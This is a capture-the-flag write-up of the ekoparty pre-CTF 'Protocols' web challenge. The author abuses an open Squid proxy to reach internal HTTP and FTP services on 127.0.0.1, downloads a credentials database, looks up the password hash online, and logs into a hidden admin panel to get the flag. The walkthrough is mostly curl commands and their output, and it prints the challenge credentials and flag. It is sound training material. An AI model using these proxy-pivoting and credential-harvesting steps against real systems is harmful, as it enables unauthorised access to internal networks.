## ekoparty_pre-ctf: web100

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| ekoparty_pre-ctf | Protocols | Web |    100 |


>*Description*
>Hack the intranet!
>http://challs.ctf.site:10002 

----------
## Write-up

Going to the site we are greeted with a squid error, squid is a proxy so lets use it as one:

>```
>$ curl -x http://challs.ctf.site:10002/ http://localhost:3128 -I
>HTTP/1.0 403 Forbidden
>Server: squid/3.1.20
>Mime-Version: 1.0
>Date: Wed, 16 Sep 2015 08:59:53 GMT
>Content-Type: text/html
>Content-Length: 3161
>X-Squid-Error: ERR_ACCESS_DENIED 0
>Vary: Accept-Language
>Content-Language: en
>X-Cache: MISS from localhost
>X-Cache-Lookup: NONE from localhost:3128
>Via: 1.0 localhost (squid/3.1.20)
>Connection: keep-alive
>```

I got stuck here for quite a while, it turns out that instead of requesting *localhost* we need to request *127.0.0.1*, much thanks to IRC for the help:

>```
>curl -x http://challs.ctf.site:10002/ http://127.0.0.1
>Intranet news
>Intranet server: insecure channel - This site has been moved
>```

More recon:

>```
>curl -k -x http://challs.ctf.site:10002/ https://127.0.0.1/robots.txt
>User-agent: *
>Disallow: /4dm1np4n3l
>```

Trying to explore the site some and SQL injection on the adminpanel did not lead to anything, remembering the challenge name is "Protocols" we try a different protocol:

>```
>$ curl -k -x http://challs.ctf.site:10002/ ftp://127.0.0.1/
><snip>
>backups/       
>```

In the backups ftp directory there is a file: credentials.db

>```
>$ curl -k -x http://challs.ctf.site:10002/ ftp://127.0.0.1/backups/credentials.db
>��;�tabl;Msuperadmin@intranet.net31b54c2ac1ccb15b9896966c3fac5c8e
>```

Seems like we got a login as: superadmin@intranet.net with password hash: 31b54c2ac1ccb15b9896966c3fac5c8e

Searching for this hash on google leads to http://pastebin.com/0RYA6PAJ, which has the plaintext: GpmlzRXj0dAlUYU7vPZB

Time to log in as admin:

>```
>$ curl -k -x http://challs.ctf.site:10002/ https://127.0.0.1/4dm1np4n3l/ -d username=superadmin@intranet.net -d password=GpmlzRXj0dAlUYU7vPZB -X POST
><snip>
>Your flag is EKO{Squid_is_also_FTP_Proxy}
>```

The flag is:

>```
>EKO{Squid_is_also_FTP_Proxy}
>```
